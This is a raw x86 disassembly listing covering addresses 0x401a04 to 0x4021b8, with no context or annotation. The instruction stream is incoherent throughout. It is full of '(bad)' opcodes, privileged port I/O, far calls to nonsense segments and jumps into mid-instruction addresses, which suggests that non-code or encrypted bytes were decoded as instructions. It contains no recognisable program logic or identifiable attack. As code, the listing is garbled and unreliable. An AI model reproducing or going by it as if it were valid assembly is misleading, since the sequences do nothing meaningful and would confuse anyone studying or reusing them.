  401a04:	and    esi,eax
  401a06:	cmp    eax,DWORD PTR [esi+0x1a]
  401a09:	or     BYTE PTR [eax-0x67],ah
  401a0c:	jp     0x401a06
  401a0e:	xchg   ebx,eax
  401a0f:	stos   DWORD PTR es:[edi],eax
  401a10:	pop    ds
  401a11:	jo     0x401a4d
  401a13:	and    DWORD PTR [edi+edx*4],ecx
  401a16:	mov    ch,0x87
  401a18:	imul   DWORD PTR [ecx-0x74d8df49]
  401a1e:	ret    0xedb0
  401a21:	push   ecx
  401a22:	fdiv   QWORD PTR [edi]
  401a24:	fidivr DWORD PTR [edi]
  401a26:	and    ebx,DWORD PTR [ecx+0x2aeaac27]
  401a2c:	stos   DWORD PTR es:[edi],eax
  401a2d:	add    ch,0x42
  401a30:	add    DWORD PTR [edx],esi
  401a32:	retf   
  401a33:	mov    bh,0x2c
  401a35:	test   al,0xe0
  401a37:	ja     0x401a03
  401a39:	jae    0x401a07
  401a3b:	xor    eax,0x5be9c279
  401a40:	add    cl,ch
  401a42:	add    eax,0x1b432b3a
  401a47:	jmp    0x401a18
  401a49:	cwde   
  401a4a:	or     edx,esp
  401a4c:	loope  0x401a91
  401a4e:	push   eax
  401a4f:	pusha  
  401a50:	mov    dh,BYTE PTR [ebp-0x4d]
  401a53:	call   0x6981:0x4bc74c59
  401a5a:	push   ebx
  401a5b:	xchg   ecx,eax
  401a5c:	sbb    BYTE PTR [edx+0x131ad2c9],dl
  401a62:	fisubr WORD PTR [edi-0x2]
  401a65:	push   edi
  401a66:	add    al,0xb7
  401a68:	out    dx,al
  401a69:	and    bh,bl
  401a6b:	dec    ecx
  401a6c:	fdiv   QWORD PTR [eax-0x881a27d]
  401a72:	and    esi,esi
  401a74:	xchg   BYTE PTR [ebp+0x38d37a73],bl
  401a7a:	inc    ebp
  401a7b:	push   0xffffff99
  401a7d:	out    dx,al
  401a7e:	mov    dh,0xb9
  401a80:	sub    al,BYTE PTR [edi-0x356457ba]
  401a86:	popf   
  401a87:	jb     0x401a8c
  401a89:	call   0xb1fd:0x3a483203
  401a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a91:	ret    
  401a92:	adc    ebp,DWORD PTR [esi+0x44719de]
  401a98:	dec    esi
  401a99:	sub    BYTE PTR [ebx-0x42c646ad],bh
  401a9f:	outs   dx,DWORD PTR ds:[esi]
  401aa0:	pusha  
  401aa1:	adc    ah,BYTE PTR [ebp+0x34]
  401aa4:	(bad)  
  401aa5:	xor    esi,eax
  401aa7:	jle    0x401ad8
  401aa9:	and    esi,DWORD PTR [edx+0x50]
  401aac:	pusha  
  401aad:	pop    ss
  401aae:	xchg   DWORD PTR [ebp+ebx*4+0x1e227ab5],esi
  401ab5:	push   ebx
  401ab6:	pop    ds
  401ab7:	inc    ebx
  401ab8:	(bad)  
  401ab9:	out    0x57,al
  401abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abc:	shl    DWORD PTR [edx],1
  401abe:	imul   edx,DWORD PTR [ebx],0xffffffe2
  401ac1:	push   cs
  401ac2:	in     al,0x58
  401ac4:	jns    0x401b3d
  401ac6:	inc    eax
  401ac7:	shr    BYTE PTR [ecx+0x59],cl
  401aca:	xchg   ebx,eax
  401acb:	aaa    
  401acc:	aam    0xba
  401ace:	inc    ecx
  401acf:	lods   al,BYTE PTR ds:[esi]
  401ad0:	shl    DWORD PTR [edx+0x44d929e8],cl
  401ad6:	fcmovnb st,st(5)
  401ad8:	clc    
  401ad9:	dec    esp
  401ada:	mov    cl,BYTE PTR [edx+ebx*8]
  401add:	popa   
  401ade:	jae    0x401adc
  401ae0:	adc    ebp,ebx
  401ae2:	jae    0x401a98
  401ae4:	adc    esp,DWORD PTR [esi+edi*4]
  401ae7:	xchg   ebx,eax
  401ae8:	or     eax,0xef04285c
  401aed:	sub    DWORD PTR [edi],0xdeee8ac0
  401af3:	out    dx,eax
  401af4:	stos   BYTE PTR es:[edi],al
  401af5:	lods   al,BYTE PTR ds:[esi]
  401af6:	mov    eax,ss
  401af8:	dec    esi
  401af9:	xchg   edi,eax
  401afa:	adc    al,0xb7
  401afc:	pop    ebx
  401afd:	or     al,BYTE PTR [eax]
  401aff:	pop    ebx
  401b00:	xchg   esp,eax
  401b01:	adc    eax,ebx
  401b03:	mov    ah,BYTE PTR ds:0x1dace92
  401b09:	mov    cl,0x12
  401b0b:	sbb    al,0xdb
  401b0d:	push   ecx
  401b0e:	sbb    edi,DWORD PTR [ebx+0x2a022aa5]
  401b14:	stc    
  401b15:	loope  0x401b52
  401b17:	xchg   DWORD PTR [eax],edi
  401b19:	sti    
  401b1a:	aaa    
  401b1b:	scas   eax,DWORD PTR es:[edi]
  401b1c:	vpunpcklwd ymm3,ymm1,YMMWORD PTR [edi-0x71204e1f]
  401b24:	faddp  st(0),st
  401b26:	jns    0x401b10
  401b28:	add    al,0x92
  401b2a:	jecxz  0x401b01
  401b2c:	loopne 0x401b19
  401b2e:	aaa    
  401b2f:	inc    ecx
  401b30:	jno    0x401b7d
  401b32:	ret    
  401b33:	scas   al,BYTE PTR es:[edi]
  401b34:	stc    
  401b35:	adc    eax,0x5ed272b8
  401b3a:	add    al,0xf8
  401b3c:	jg     0x401b2e
  401b3e:	push   ecx
  401b3f:	and    eax,0x9d4ab108
  401b44:	adc    DWORD PTR [edi],ebx
  401b46:	repz xor BYTE PTR [ecx],0x6f
  401b4a:	or     dh,BYTE PTR [ecx]
  401b4c:	xchg   edx,eax
  401b4d:	cmp    bh,BYTE PTR [edx]
  401b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b50:	push   es
  401b51:	pop    ebp
  401b52:	mov    ds:0x993a911e,al
  401b57:	outs   dx,BYTE PTR ds:[si]
  401b59:	ror    esi,cl
  401b5b:	sbb    eax,0x12dd2c96
  401b60:	xchg   edx,eax
  401b61:	or     al,bh
  401b63:	mov    ebx,0x93ece04a
  401b68:	xor    edx,DWORD PTR [ebp+0x0]
  401b6b:	lods   al,BYTE PTR ds:[esi]
  401b6c:	aas    
  401b6d:	(bad)  
  401b6e:	loope  0x401b81
  401b70:	push   edx
  401b71:	ret    0xf297
  401b74:	out    dx,eax
  401b75:	fisttp DWORD PTR [esi-0x645fca74]
  401b7b:	out    0x10,al
  401b7d:	sbb    BYTE PTR [ecx+eax*1],al
  401b80:	test   al,0xb7
  401b82:	stc    
  401b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b84:	jmp    0x401be9
  401b86:	jecxz  0x401b44
  401b88:	str    WORD PTR ds:[ecx+0x37]
  401b8d:	pop    edi
  401b8e:	(bad)  
  401b8f:	out    0xf5,eax
  401b91:	cs xchg edi,eax
  401b93:	sahf   
  401b94:	je     0x401bba
  401b96:	pop    ss
  401b97:	dec    edx
  401b98:	jmp    0x2fd9:0xcf24f35b
  401b9f:	ja     0x401ba3
  401ba1:	inc    eax
  401ba2:	and    eax,0xdb2ba82c
  401ba7:	lods   eax,DWORD PTR ds:[esi]
  401ba8:	call   0x4765fa7a
  401bad:	ret    
  401bae:	xchg   edx,eax
  401baf:	push   0x28
  401bb1:	in     eax,dx
  401bb2:	sub    BYTE PTR [edx+0x14],0x76
  401bb6:	xor    bh,BYTE PTR [esp+edx*2]
  401bb9:	jb     0x401bc4
  401bbb:	pushf  
  401bbc:	or     eax,0x2e4f2a27
  401bc1:	pop    ebx
  401bc3:	dec    ecx
  401bc4:	retf   0xd1e1
  401bc7:	ins    DWORD PTR es:[edi],dx
  401bc8:	icebp  
  401bc9:	and    esi,edi
  401bcb:	lahf   
  401bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bcd:	push   eax
  401bce:	push   edx
  401bcf:	mov    eax,ds:0xc66b7dfa
  401bd4:	retf   
  401bd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bd6:	retf   0xd620
  401bd9:	add    DWORD PTR [eax-0x581920bd],0x3f
  401be0:	gs cmp al,0xa2
  401be3:	dec    edi
  401be4:	imul   esi,DWORD PTR [eax+eiz*8+0x3c490868],0x29
  401bec:	pop    edx
  401bed:	sar    DWORD PTR [ebx+0x69],0x34
  401bf1:	mov    ch,0xb5
  401bf3:	push   cs
  401bf4:	rcl    cl,1
  401bf6:	das    
  401bf7:	addr16 rol dl,cl
  401bfa:	or     DWORD PTR [esp+ebp*4],0xdda12916
  401c01:	lock push ecx
  401c03:	jmp    0x2e2d:0xc516f56d
  401c0a:	dec    ebx
  401c0b:	sti    
  401c0c:	outs   dx,DWORD PTR ds:[esi]
  401c0d:	xchg   edi,eax
  401c0e:	and    BYTE PTR [edi],ch
  401c10:	sub    eax,0x1a89e301
  401c15:	dec    ebp
  401c16:	enter  0x477c,0x4f
  401c1a:	and    bh,BYTE PTR [esi+0x62a53eb3]
  401c20:	outs   dx,BYTE PTR ds:[esi]
  401c21:	sub    ah,bh
  401c23:	fwait
  401c24:	mov    ch,0xce
  401c26:	xchg   ecx,eax
  401c27:	and    al,0x5d
  401c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c2a:	sar    BYTE PTR [esi],cl
  401c2c:	enter  0x3b02,0x54
  401c30:	jno    0x401c0f
  401c32:	mov    ds:0x611a947,al
  401c37:	dec    DWORD PTR [ebx-0x1239ae6e]
  401c3d:	mov    al,0xfc
  401c3f:	and    BYTE PTR [esi-0x2c],cl
  401c42:	xor    eax,0x7eb8683b
  401c47:	iret   
  401c48:	jbe    0x401c1a
  401c4a:	xor    al,0x97
  401c4c:	push   ecx
  401c4d:	mov    eax,ds:0xb51ba50
  401c52:	push   edx
  401c53:	sbb    eax,0x4bcdb198
  401c58:	ret    0xe1b9
  401c5b:	pop    ds
  401c5c:	cmp    esi,ebp
  401c5e:	into   
  401c5f:	mov    BYTE PTR [ebp+0x3e],bh
  401c62:	mov    WORD PTR [edx],ss
  401c64:	adc    DWORD PTR [ebp+0xc],esi
  401c67:	xchg   BYTE PTR [ecx-0x4de86b94],al
  401c6d:	mov    edx,0x12557476
  401c72:	es cld 
  401c74:	mov    edi,DWORD PTR [edi+0x5527693f]
  401c7a:	mov    ebp,0x90c6b705
  401c7f:	out    0xfe,al
  401c81:	jl     0x401c60
  401c83:	jns    0x401c63
  401c85:	int    0x24
  401c87:	cmp    eax,0xfa36d201
  401c8c:	sbb    al,0x70
  401c8e:	jp     0x401cee
  401c90:	and    eax,0x412217a4
  401c95:	sub    BYTE PTR [edx+0x57],bh
  401c98:	call   0x3d7ab1fa
  401c9d:	jmp    0x6806:0x8dac048d
  401ca4:	dec    edx
  401ca5:	cmp    eax,0xa6ac7930
  401caa:	pop    ebp
  401cab:	sub    al,0x2c
  401cad:	jns    0x401c43
  401caf:	retf   
  401cb0:	lea    esp,[edx]
  401cb2:	mov    ds:0x35e4a9e7,eax
  401cb7:	cmp    esp,DWORD PTR [bx]
  401cba:	pop    edx
  401cbb:	ret    0x8842
  401cbe:	sbb    DWORD PTR [ecx-0x7f],esi
  401cc1:	pop    edi
  401cc2:	jmp    0x7efdd1c8
  401cc7:	or     eax,0x4bc77058
  401ccc:	xchg   esi,eax
  401ccd:	inc    eax
  401cce:	sub    DWORD PTR [ebx+0x52],0xd69ca48b
  401cd5:	push   edx
  401cd6:	xlat   BYTE PTR ds:[ebx]
  401cd7:	mov    es,ebp
  401cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cda:	dec    edx
  401cdb:	ds jb  0x401c87
  401cde:	lods   al,BYTE PTR ds:[esi]
  401cdf:	outs   dx,BYTE PTR ds:[esi]
  401ce0:	push   cs
  401ce1:	sti    
  401ce2:	arpl   WORD PTR [eax],di
  401ce4:	aam    0xdb
  401ce6:	out    dx,eax
  401ce7:	dec    esi
  401ce8:	sub    eax,0x9354501
  401ced:	sub    al,0x5f
  401cef:	xchg   BYTE PTR [ebp-0x396bf66e],ah
  401cf5:	pop    esi
  401cf6:	inc    esi
  401cf7:	ret    
  401cf8:	(bad)  
  401cf9:	jmp    0x2113:0xc89ed388
  401d00:	sbb    DWORD PTR [edx],eax
  401d02:	mov    bl,0x3d
  401d04:	out    0x1d,al
  401d06:	dec    ebx
  401d07:	mov    bl,0x82
  401d09:	pop    ecx
  401d0a:	jmp    0x401d11
  401d0c:	xchg   ebp,eax
  401d0d:	(bad)  
  401d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d0f:	jmp    0x401cdb
  401d11:	ins    DWORD PTR es:[edi],dx
  401d12:	cmp    eax,0x745c11bb
  401d17:	dec    ebx
  401d18:	daa    
  401d19:	adc    DWORD PTR [ecx-0x61],0xfffffff0
  401d1d:	sbb    al,ah
  401d1f:	fldenv ds:[eax+0x646e9bc0]
  401d26:	neg    DWORD PTR [edi]
  401d28:	aas    
  401d29:	stos   BYTE PTR es:[edi],al
  401d2a:	jmp    0x401ce2
  401d2c:	js     0x401cf2
  401d2e:	jnp    0x401ce4
  401d30:	icebp  
  401d31:	bound  eax,QWORD PTR [edi*2-0xa7e2384]
  401d38:	push   edx
  401d39:	xchg   ecx,eax
  401d3a:	adc    ebx,ebp
  401d3c:	(bad)  
  401d3d:	cmp    eax,0x53954e1f
  401d42:	add    BYTE PTR es:[ebx+0x2a],bl
  401d46:	pop    ebp
  401d47:	out    0x67,eax
  401d49:	shl    BYTE PTR [ebp+0x3ed910e2],1
  401d4f:	mov    eax,eax
  401d51:	ds data16 mov al,dh
  401d55:	sbb    al,0x5e
  401d57:	pop    ds
  401d58:	push   edx
  401d59:	push   es
  401d5a:	push   eax
  401d5b:	mov    BYTE PTR [eax-0x20b36ba8],dh
  401d61:	repz mov eax,ds:0x1c877838
  401d67:	fdivr  DWORD PTR [eax-0x366f0d98]
  401d6d:	popa   
  401d6e:	jmp    DWORD PTR [ebx-0x71]
  401d71:	xchg   ecx,eax
  401d72:	mov    ds:0xe9822e79,eax
  401d77:	or     dh,BYTE PTR [esi+ebp*8-0x5048e80b]
  401d7e:	or     al,0x12
  401d80:	add    BYTE PTR [ebp+edi*2+0x62c3f1],bh
  401d87:	add    al,0xca
  401d89:	lahf   
  401d8a:	pop    ecx
  401d8b:	mov    dh,0x91
  401d8d:	cld    
  401d8e:	xor    edx,DWORD PTR [ebp+eax*4+0x5478516b]
  401d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d96:	in     eax,dx
  401d97:	mov    esp,0xeeda4bae
  401d9c:	mov    cl,BYTE PTR [ebp-0x673b5a88]
  401da2:	mov    BYTE PTR [ebx+0x2f09837],0xcd
  401da9:	lahf   
  401daa:	cmc    
  401dab:	popa   
  401dac:	retf   
  401dad:	xor    bl,BYTE PTR [esi]
  401daf:	mov    es,WORD PTR [ebx+0x16]
  401db2:	xchg   edi,eax
  401db3:	dec    eax
  401db4:	mov    ebp,0x23d2409a
  401db9:	adc    BYTE PTR [ebp+0x19645887],0x84
  401dc0:	sbb    DWORD PTR [edi-0x15],edi
  401dc3:	aas    
  401dc4:	adc    DWORD PTR ds:[ecx+0x60],eax
  401dc8:	push   ss
  401dc9:	mov    bl,0x17
  401dcb:	scas   eax,DWORD PTR es:[edi]
  401dcc:	mov    bl,0x8a
  401dce:	cdq    
  401dcf:	cmp    edi,ecx
  401dd1:	push   ebx
  401dd2:	jae    0x401e4c
  401dd4:	loop   0x401dc4
  401dd6:	xchg   edi,eax
  401dd7:	scas   eax,DWORD PTR es:[edi]
  401dd8:	gs out dx,al
  401dda:	stos   BYTE PTR es:[edi],al
  401ddb:	iret   
  401ddc:	sti    
  401ddd:	call   0xa09b:0xddd9532e
  401de4:	sbb    eax,0xfdd9374b
  401de9:	imul   edi,DWORD PTR [eax+ecx*4+0x21],0x17314785
  401df1:	xchg   edi,eax
  401df2:	je     0x401d8b
  401df4:	pop    ebx
  401df5:	out    0x47,al
  401df7:	fsqrt  
  401df9:	add    eax,0x73c3bac2
  401dfe:	arpl   WORD PTR [ebx-0x5],di
  401e01:	mov    al,BYTE PTR [ebp-0x13c8da75]
  401e07:	js     0x401e08
  401e09:	jecxz  0x401dd3
  401e0b:	cs sub al,0x8a
  401e0e:	out    0x94,eax
  401e10:	fild   WORD PTR [ebx]
  401e12:	cwde   
  401e13:	js     0x401e68
  401e15:	aas    
  401e16:	fist   DWORD PTR [ebp-0x3fdcaeee]
  401e1c:	out    0x28,al
  401e1e:	mov    dl,0x15
  401e20:	test   BYTE PTR [ebp-0x6ebe3a46],0x1c
  401e27:	dec    ebp
  401e28:	push   edx
  401e29:	cli    
  401e2a:	loop   0x401e65
  401e2c:	imul   edi,DWORD PTR [edx-0x73],0x93718fac
  401e33:	jb     0x401e5b
  401e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e36:	push   eax
  401e37:	fld    DWORD PTR [edx-0x2c738e8]
  401e3d:	jl     0x401dc1
  401e3f:	ins    DWORD PTR es:[edi],dx
  401e40:	dec    esp
  401e41:	into   
  401e42:	sub    BYTE PTR [ecx+esi*1],0x56
  401e46:	cmp    al,0x5e
  401e48:	lahf   
  401e49:	mov    eax,DWORD PTR [ebx+eiz*4-0x17]
  401e4d:	lods   eax,DWORD PTR ds:[esi]
  401e4e:	ja     0x401de5
  401e50:	jmp    0x401de1
  401e52:	mov    ebx,0x2e501265
  401e57:	mov    ebp,0xfcf3797a
  401e5c:	dec    esi
  401e5d:	cmp    ah,BYTE PTR [edx-0x1]
  401e60:	call   0x9cc7:0x4a60d53a
  401e67:	enter  0xcb28,0x1c
  401e6b:	jmp    0x948b:0xa08dd421
  401e72:	cmp    cl,BYTE PTR [eax-0x5d]
  401e75:	cwde   
  401e76:	popa   
  401e77:	jbe    0x401e60
  401e79:	into   
  401e7a:	fnstsw WORD PTR [edx-0x1e8530ff]
  401e80:	or     BYTE PTR [ecx-0x360f978],dh
  401e86:	sub    ch,ch
  401e88:	scas   al,BYTE PTR es:[edi]
  401e89:	and    DWORD PTR [edx+0x4d],0xffffffc5
  401e8d:	mov    eax,ds:0x5a42fafd
  401e92:	sbb    BYTE PTR ss:[edx+0x62],dh
  401e96:	mov    esp,0xd268c412
  401e9b:	and    eax,0xc894f9fc
  401ea0:	rol    DWORD PTR [ecx-0xbd3558],0xf3
  401ea7:	imul   esp,esp,0x9b0be3e1
  401ead:	sbb    al,0x30
  401eaf:	add    al,al
  401eb1:	out    0x28,eax
  401eb3:	mov    ecx,0x94d70d3c
  401eb8:	movhps QWORD PTR [eax+0x1321f745],xmm6
  401ebf:	jle    0x401ec4
  401ec1:	js     0x401f05
  401ec3:	mov    dh,0x8e
  401ec5:	mov    edx,0xebc9038f
  401eca:	sub    BYTE PTR [esi],ah
  401ecc:	mov    bh,0x77
  401ece:	push   0x1aeb0fb3
  401ed3:	jne    0x401e79
  401ed5:	inc    eax
  401ed6:	and    al,0x74
  401ed8:	pop    esi
  401ed9:	xchg   ebp,eax
  401eda:	in     al,dx
  401edb:	(bad)  
  401edc:	out    dx,al
  401edd:	dec    edi
  401ede:	add    ah,BYTE PTR [ebp+0x59]
  401ee1:	push   esp
  401ee2:	sbb    eax,0xe6221725
  401ee7:	pop    edi
  401ee8:	xor    al,0xdc
  401eea:	inc    edi
  401eeb:	dec    ecx
  401eec:	(bad)  
  401eed:	mov    ch,0xbf
  401eef:	xlat   BYTE PTR ds:[ebx]
  401ef0:	daa    
  401ef1:	xor    ebp,0x7db6df8e
  401ef7:	add    BYTE PTR [ecx+0x4d],ah
  401efa:	mov    DWORD PTR [edi+0x4d76ad99],0xaaca9aca
  401f04:	sahf   
  401f05:	jb     0x401f77
  401f07:	in     eax,0x99
  401f09:	mov    bl,0xc8
  401f0b:	pop    esi
  401f0c:	pop    eax
  401f0d:	xor    eax,0x18fdfd94
  401f12:	repz ds fwait
  401f15:	cli    
  401f16:	rcr    BYTE PTR [edx],cl
  401f18:	gs test ebx,0x94ca6365
  401f1f:	push   edx
  401f20:	xor    eax,ebp
  401f22:	in     al,dx
  401f23:	cwde   
  401f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f25:	jns    0x401fa4
  401f27:	sub    eax,DWORD PTR [esi+eiz*4+0x1739c527]
  401f2e:	inc    edi
  401f2f:	sub    BYTE PTR [eax+0x7b],cl
  401f32:	dec    edx
  401f33:	mov    esi,0x256b1319
  401f38:	pop    es
  401f39:	sub    DWORD PTR [edi],edx
  401f3b:	(bad)  
  401f3c:	retf   
  401f3d:	rcl    BYTE PTR [ebx],0xa3
  401f40:	pop    edx
  401f41:	repnz push esi
  401f43:	jmp    0x401f81
  401f45:	scas   al,BYTE PTR es:[edi]
  401f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f47:	fwait
  401f48:	out    0x2c,al
  401f4a:	push   edi
  401f4b:	jns    0x401eee
  401f4d:	jo     0x401f53
  401f4f:	(bad)  
  401f50:	aam    0xa5
  401f52:	add    ah,BYTE PTR [esi]
  401f54:	int    0xb0
  401f56:	push   eax
  401f57:	(bad)  
  401f58:	fidivr DWORD PTR [edi-0x17]
  401f5b:	cmp    cl,ch
  401f5d:	mov    edx,DWORD PTR [ecx-0x201c1e85]
  401f63:	xchg   ecx,eax
  401f64:	jp     0x401fca
  401f66:	jl     0x401f75
  401f68:	jno    0x401faa
  401f6a:	pop    esp
  401f6b:	jl     0x401f46
  401f6d:	shr    BYTE PTR [ecx-0x26444500],0xb6
  401f74:	int3   
  401f75:	push   0xffffff9e
  401f77:	das    
  401f78:	xor    eax,0x5e137f4e
  401f7d:	dec    edi
  401f7e:	jl     0x401f90
  401f80:	shl    eax,1
  401f82:	call   0xc134:0x7dc03831
  401f89:	in     al,dx
  401f8a:	es gs icebp 
  401f8d:	jle    0x401f45
  401f8f:	xchg   esi,eax
  401f90:	xor    bh,BYTE PTR [edi+edi*8]
  401f93:	clc    
  401f94:	jno    0x401f5f
  401f96:	rcl    DWORD PTR [ebx+esi*4+0x6c371bcb],cl
  401f9d:	jae    0x401ff8
  401f9f:	cli    
  401fa0:	inc    ebp
  401fa1:	push   es
  401fa2:	jmp    0x82a6e1ea
  401fa7:	mov    cl,0x54
  401fa9:	fmulp  st(5),st
  401fab:	das    
  401fac:	push   edx
  401fad:	shl    DWORD PTR [ecx+0x15],1
  401fb0:	inc    esp
  401fb1:	shr    DWORD PTR [edi+0x6e63ed58],0xc4
  401fb8:	push   cs
  401fb9:	sbb    DWORD PTR [ebx+0x22],edi
  401fbc:	push   esp
  401fbd:	sbb    dh,BYTE PTR [esi]
  401fbf:	fcos   
  401fc1:	out    dx,eax
  401fc2:	cdq    
  401fc3:	arpl   dx,bx
  401fc5:	xchg   ebx,eax
  401fc6:	in     ax,dx
  401fc8:	add    al,ch
  401fca:	adc    BYTE PTR [edi],dh
  401fcc:	popa   
  401fcd:	xor    DWORD PTR ds:0x7025bde9,0xbb1c84a4
  401fd7:	dec    edi
  401fd8:	js     0x402017
  401fda:	jmp    0x737da13e
  401fdf:	cmp    BYTE PTR [esi+0x26],dl
  401fe2:	push   ds
  401fe3:	test   eax,0x5c5bd4a4
  401fe8:	rcr    BYTE PTR [esi+0x6a],cl
  401feb:	shl    BYTE PTR [ebp+0x4d],1
  401fee:	rcr    DWORD PTR [ecx+ebp*4+0x4aebdd74],0x66
  401ff6:	mov    ds:0x120c6232,al
  401ffb:	jecxz  0x40203d
  401ffd:	stc    
  401ffe:	vpunpckhbw xmm2,xmm3,XMMWORD PTR [ebp+0xfe9472]
  402006:	sti    
  402007:	mov    esp,0x4c58e26a
  40200c:	xchg   ebp,eax
  40200d:	rcr    bl,1
  40200f:	push   ebx
  402010:	xor    cl,BYTE PTR [eax+esi*2-0x4e]
  402014:	pop    ebx
  402015:	push   ds
  402016:	cs push eax
  402018:	mov    al,0x94
  40201a:	mov    esp,0x885020d0
  40201f:	pop    ecx
  402020:	push   edx
  402021:	push   0xad3ad8a2
  402026:	out    0x25,al
  402028:	cs pop ss
  40202a:	loopne 0x402028
  40202c:	jo     0x40200b
  40202e:	sti    
  40202f:	cld    
  402030:	outs   dx,BYTE PTR ds:[esi]
  402031:	push   eax
  402032:	mov    dh,0xb0
  402034:	sub    bl,BYTE PTR [edi]
  402036:	outs   dx,DWORD PTR ds:[esi]
  402037:	(bad)  
  402039:	xor    DWORD PTR [ebp+0x2dee1c48],eax
  40203f:	pop    esi
  402040:	sub    BYTE PTR [esi-0x7aae5365],ah
  402046:	out    dx,al
  402047:	push   esi
  402048:	call   0xf4201ef1
  40204d:	mov    ebx,0xec9f5f70
  402052:	xor    ecx,DWORD PTR [eax-0x65bb5539]
  402058:	mov    eax,ds:0xd34e9f1e
  40205d:	sbb    edi,ecx
  40205f:	add    al,dh
  402061:	fnstenv [edi+ebp*2]
  402064:	mov    ss,WORD PTR [esi]
  402066:	mov    edx,0x5d9192f4
  40206b:	pop    eax
  40206c:	jb     0x4020bc
  40206e:	and    ebx,DWORD PTR [ecx]
  402070:	jnp    0x4020dd
  402072:	pop    edx
  402073:	rcr    BYTE PTR [ecx+0x2d],cl
  402076:	jge    0x40209d
  402078:	dec    edx
  402079:	pusha  
  40207a:	arpl   WORD PTR [edx+0x63],cx
  40207d:	cmp    BYTE PTR [eax-0x6b710f51],0x9
  402084:	neg    BYTE PTR [esi+ebx*4]
  402087:	shr    dh,cl
  402089:	inc    edx
  40208a:	fwait
  40208b:	inc    ebp
  40208c:	div    BYTE PTR [ebx+ebx*2+0x65]
  402090:	es push es
  402092:	sub    al,0xa8
  402094:	push   cs
  402095:	(bad)  
  402096:	jp     0x4020f0
  402098:	call   0x2fc99f0e
  40209d:	retf   
  40209e:	jmp    0x4020ff
  4020a0:	jmp    0x7745b923
  4020a5:	rcr    edi,0xac
  4020a8:	push   ebp
  4020a9:	jge    0x40208b
  4020ab:	pop    edx
  4020ac:	push   esi
  4020ad:	scas   al,BYTE PTR es:[edi]
  4020ae:	in     eax,0x8e
  4020b0:	fimul  WORD PTR [esi+ecx*1-0x28]
  4020b4:	xchg   esi,eax
  4020b5:	xchg   edx,eax
  4020b6:	push   DWORD PTR [ebp-0x38933768]
  4020bc:	out    dx,eax
  4020bd:	shl    DWORD PTR [eax+0x3b65ba20],cl
  4020c3:	push   es
  4020c4:	add    eax,0x9066c6e0
  4020c9:	and    eax,ebx
  4020cb:	lds    ecx,FWORD PTR [esi-0x29623f57]
  4020d1:	adc    al,0xaa
  4020d3:	in     eax,dx
  4020d4:	sub    al,0xb1
  4020d6:	xor    al,ah
  4020d8:	stos   DWORD PTR es:[edi],eax
  4020d9:	cmp    BYTE PTR [edi+0x6a],bh
  4020dc:	loope  0x402150
  4020de:	push   ss
  4020df:	popf   
  4020e0:	dec    ebx
  4020e1:	xchg   ebp,eax
  4020e2:	or     al,0x6
  4020e4:	add    ch,ah
  4020e6:	out    0x20,eax
  4020e8:	mov    eax,ds:0x8ba8b484
  4020ed:	es out dx,al
  4020ef:	addr16 mov eax,ds:0x6e5
  4020f3:	xchg   DWORD PTR [edx-0x5cf7d07a],esp
  4020f9:	icebp  
  4020fa:	lods   al,BYTE PTR ds:[esi]
  4020fb:	mov    ch,0x91
  4020fd:	and    ch,BYTE PTR [ebp+esi*4-0x6a]
  402101:	(bad)  
  402102:	out    dx,al
  402103:	pusha  
  402104:	inc    edi
  402105:	jmp    0x402181
  402107:	xchg   BYTE PTR [edi-0x3cf326d5],dl
  40210d:	in     al,0x44
  40210f:	dec    esi
  402110:	call   0x5f53:0x8de563b7
  402117:	ja     0x40209c
  402119:	mov    edx,0xb8c3934c
  40211e:	pop    ebp
  40211f:	cmp    ah,cl
  402121:	repnz rcr BYTE PTR [ebp+0x6e],1
  402125:	(bad)  
  402126:	cli    
  402127:	mov    cl,0x6f
  402129:	xor    DWORD PTR [edi+ebx*1-0x4f4632fe],edi
  402130:	inc    edi
  402131:	and    al,0xc6
  402133:	mov    ebp,DWORD PTR [edi+0x3e]
  402136:	sti    
  402137:	push   esp
  402138:	repnz shl ebp,1
  40213b:	xor    eax,0x2debe0f
  402140:	cmp    eax,0xaf6ff0bb
  402145:	mov    ebp,0xfd02c416
  40214a:	mov    BYTE PTR [esi+0xa],bl
  40214d:	or     eax,DWORD PTR [ebp-0x52570fac]
  402153:	sub    eax,0xf59a70c9
  402158:	xchg   BYTE PTR [ecx-0x16ca70bd],bl
  40215e:	jecxz  0x4021b1
  402160:	fcomp  DWORD PTR fs:[esi-0x30]
  402164:	dec    edx
  402165:	or     al,0x13
  402167:	dec    esp
  402168:	mov    dl,0x68
  40216a:	jmp    0x4021ac
  40216c:	adc    DWORD PTR [ecx+0x74],esi
  40216f:	mov    edi,0x9e0c45bb
  402174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402175:	loopne 0x402186
  402177:	or     eax,0xd8fb5bc6
  40217c:	cli    
  40217d:	add    eax,DWORD PTR [ebx]
  40217f:	cmc    
  402180:	push   ebx
  402181:	(bad)  
  402182:	xchg   ebx,eax
  402183:	adc    BYTE PTR [edx],bh
  402185:	push   edi
  402186:	add    al,0x17
  402188:	test   al,ah
  40218a:	nop
  40218b:	xor    bl,BYTE PTR [esi+ebp*2+0x4f9fdcdf]
  402192:	hlt    
  402193:	imul   esp,DWORD PTR [ebx-0x78bd41e4],0x2c
  40219a:	out    0x3d,al
  40219c:	pop    ebx
  40219d:	jecxz  0x4021fb
  40219f:	mov    esp,0x90ab2974
  4021a4:	(bad)  
  4021a5:	pop    ecx
  4021a6:	mov    ecx,es
  4021a8:	push   ecx
  4021a9:	jae    0x402180
  4021ab:	xlat   BYTE PTR ds:[ebx]
  4021ac:	push   ecx
  4021ad:	inc    esp
  4021ae:	push   0x70
  4021b0:	push   ds
  4021b1:	jp     0x4021d0
  4021b3:	gs jp  0x40221c
  4021b6:	mov    cl,0xd6
  4021b8:	das    
